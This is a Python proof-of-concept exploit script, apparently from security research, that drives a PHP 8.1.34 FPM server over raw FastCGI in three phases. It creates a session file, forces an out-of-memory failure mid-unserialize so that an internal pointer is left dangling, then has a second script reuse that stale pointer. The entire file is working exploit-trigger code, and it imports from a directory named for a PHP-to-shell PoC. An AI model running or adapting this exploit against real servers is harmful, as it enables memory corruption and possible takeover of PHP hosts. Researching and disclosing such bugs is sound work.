#!/usr/bin/env python3
"""FastCGI adaptation of poc_stale_state.py (CVE-2026-109619 BG(unserialize)
producer/consumer) for PHP 8.1.34 FPM — reads the response to EOF, then parses
FastCGI records from the buffer (robust against partial reads).

Phase 1: create session file (upload-progress POST)
Phase 2: producer.php — unserialize() of 200k elements OOMs at 4M mid-decode,
         PHP_VAR_UNSERIALIZE_DESTROY skipped -> BG(unserialize) dangling
Phase 3: consumer.php — pre-RINIT session decode reuses the stale pointer
"""
import argparse
import socket
import struct
import sys
import time

sys.path.insert(0, "/tmp/p2s-research/php2shell-poc")
import fcgi_client
from poc_stale_state import multipart, BOUNDARY


def parse_records(buf):
    records = []
    i = 0
    while i + 8 <= len(buf):
        try:
            ver, rtype, rid, clen, pad, _res = struct.unpack(">BBHHBB", buf[i:i + 8])
        except struct.error as e:
            print(f"    [parse] len(buf)={len(buf)} i={i} err={e}")
            break
        if i + 8 + clen > len(buf):
            print(f"    [parse] truncated record at {i}: clen={clen} pad={pad} "
                  f"len={len(buf)}")
            break
        content = buf[i + 8:i + 8 + clen]
        records.append((rtype, content))
        i += 8 + clen + pad
    return records, buf[i:]


def fcgi_post(host, port, script, body, timeout=60):
    s = socket.create_connection((host, port), timeout=30)
    s.settimeout(2)
    s.sendall(fcgi_client._make_record(1, 1, struct.pack(">HB5x", 1, 0)))
    params = {
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/" + script.rsplit("/", 1)[-1],
        "REQUEST_METHOD": "POST",
        "DOCUMENT_ROOT": "/tmp/poctest",
        "CONTENT_TYPE": "multipart/form-data; boundary=" + BOUNDARY,
        "CONTENT_LENGTH": str(len(body)),
        "QUERY_STRING": "",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "GATEWAY_INTERFACE": "CGI/1.1",
        "SERVER_SOFTWARE": "poc",
        "REMOTE_ADDR": "127.0.0.1",
    }
    pairs = []
    for k, v in params.items():
        kb, vb = k.encode(), v.encode()
        pairs.append(fcgi_client._enc_len(len(kb)) + fcgi_client._enc_len(len(vb)) + kb + vb)
    s.sendall(fcgi_client._make_record(4, 1, b"".join(pairs)))
    s.sendall(fcgi_client._make_record(4, 1, b""))
    s.sendall(fcgi_client._make_record(5, 1, body))
    s.sendall(fcgi_client._make_record(5, 1, b""))
    buf = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            if buf:
                time.sleep(0.5)
                continue
            break
        if not chunk:
            break
        buf += chunk
    s.close()
    records, leftover = parse_records(buf)
    stdout = b"".join(c for rtype, c in records if rtype == 6)
    stderr = b"".join(c for rtype, c in records if rtype == 7)
    ended = any(rtype == 3 for rtype, _ in records)
    return stdout, stderr, ended, leftover


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9001)
    ap.add_argument("--sid", default="abcdef0123456789abcdef0123456789")
    args = ap.parse_args()

    body = multipart([], args.sid, "poc", files=1)
    for phase, script in ((1, "/tmp/poctest/index.php"),
                          (2, "/tmp/poctest/producer.php"),
                          (3, "/tmp/poctest/consumer.php")):
        stdout, stderr, ended, leftover = fcgi_post(args.host, args.port, script, body)
        print(f"[{phase}] {script.rsplit('/', 1)[-1]}: ended={ended} "
              f"leftover={len(leftover)}B")
        print(f"    stdout: {stdout[:300]!r}")
        if stderr:
            print(f"    stderr: {stderr[:300]!r}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
